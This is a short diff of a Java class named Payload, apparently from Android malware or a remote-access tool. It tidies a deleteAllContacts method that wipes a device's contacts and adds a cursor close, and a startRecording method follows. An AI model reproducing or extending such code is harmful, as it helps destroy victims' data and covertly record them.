@@ -21,8 +21,7 @@ public class Payload {
 
     public static void deleteAllContacts(Context context) {
         ContentResolver cr = context.getContentResolver();
-        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
-                null, null, null, null);
+        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
         assert cur != null;
         while (cur.moveToNext()) {
             try {
@@ -33,6 +32,7 @@ public class Payload {
             } catch (Exception e) {
             }
         }
+        cur.close();
     }
 
     public static void startRecording(Context applicationContext) {
